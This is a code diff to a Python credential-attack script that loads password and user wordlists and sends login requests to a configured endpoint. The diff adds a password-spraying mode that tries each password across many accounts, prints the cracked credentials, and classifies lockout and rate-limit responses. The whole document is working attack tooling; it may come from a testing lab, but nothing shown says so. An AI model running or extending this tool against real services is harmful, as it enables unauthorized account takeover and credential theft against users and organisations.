@@ -43,30 +43,28 @@ def log_attempt(config, username, password, status_code, result, latency, attack
         print(f"Error writing to log: {e}")
 
 
-def load_password_list(file_path, max_attempts=None):
+def load_list_from_file(file_path, max_items=None):
     if not os.path.exists(file_path):
-        raise FileNotFoundError(f"Password file '{file_path}' not found")
+        raise FileNotFoundError(f"File '{file_path}' not found")
 
-    passwords = []
+    items = []
     try:
-        # Try different encodings to handle files like rockyou.txt
+        # supports different languages in case of latin chars
         for encoding in ['utf-8', 'latin-1']:
             try:
                 with open(file_path, 'r', encoding=encoding, errors='ignore') as f:
-                    # Strip whitespace and ignore empty lines
-                    passwords = [line.strip() for line in f if line.strip()]
+                    items = [line.strip() for line in f if line.strip()]
                 break
             except UnicodeDecodeError:
                 continue
 
-        if max_attempts and max_attempts > 0:
-            passwords = passwords[:max_attempts]
+        if max_items and max_items > 0:
+            items = items[:max_items]
 
-        print(f"Loaded {len(passwords)} passwords from {file_path}")
-        return passwords
+        print(f"Loaded {len(items)} items from {file_path}")
+        return items
     except Exception as e:
-        print(f"Error reading password file: {e}")
-        sys.exit(1)
+        raise RuntimeError(f"Error loading file: {e}")
 
 
 def attempt_login(config, username, password, attack_type):
@@ -81,8 +79,16 @@ def attempt_login(config, username, password, attack_type):
             timeout=config.get("request_timeout", 5)
         )
         status_code = response.status_code
-        # 200 OK or 401 Unauthorized
-        result = "SUCCESS" if status_code == 200 else "FAILURE"
+        if status_code == 200:
+            result = "SUCCESS"
+        elif status_code == 401:
+            result = "FAILURE"
+        elif status_code == 403:
+            result = "LOCKED"
+        elif status_code == 429:
+            result = "RATE_LIMIT"
+        else:
+            result = f"UNKNOWN_{status_code}"
     except requests.exceptions.RequestException as e:
         print(f"Connection Error: {e}")
 
@@ -99,7 +105,7 @@ def run_brute_force(config):
     password_file = config["password_file"]
     max_attempts = config.get("max_attempts", 0)
     print(f"Starting brute force attack on user: {target_user}")
-    passwords = load_password_list(password_file, max_attempts)
+    passwords = load_list_from_file(password_file, max_attempts)
     for password in passwords:
         is_success = attempt_login(config, target_user, password, "Brute-Force")
         if is_success:
@@ -108,7 +114,41 @@ def run_brute_force(config):
     print("Brute force attack finished")
 
 
+def run_password_spraying(config):
+    user_file = config["user_file"]
+    password_file = config["password_file"]
+    max_passwords = config.get("max_attempts", 0)
+
+    print(f"Starting password spraying attack")
+    users = load_list_from_file(user_file)
+    passwords = load_list_from_file(password_file, max_passwords)
+
+    active_users = list(users)
+
+    for password in passwords:
+        if not active_users:
+            print("All users cracked! Stopping.")
+            break
+
+        print(f"Spraying password: {password}")
+
+        for user in list(active_users):
+            is_success = attempt_login(config, user, password, "Password-Spraying")
+
+            if is_success:
+                print(f"SUCCESS! LOGIN CREDS: {user} : {password}")
+                # הסרת המשתמש מהרשימה כדי לא לתקוף אותו שוב
+                active_users.remove(user)
+
+    print("Password spraying attack finished")
+    print(f"Remaining uncracked users: {len(active_users)}")
+
+
 if __name__ == "__main__":
     config = load_config()
     init_log_file(config["log_file"])
-    run_brute_force(config)
+    mode = config.get("attack_mode", "brute-force").lower()
+    if mode == "password_spraying":
+        run_password_spraying(config)
+    else:
+        run_brute_force(config)
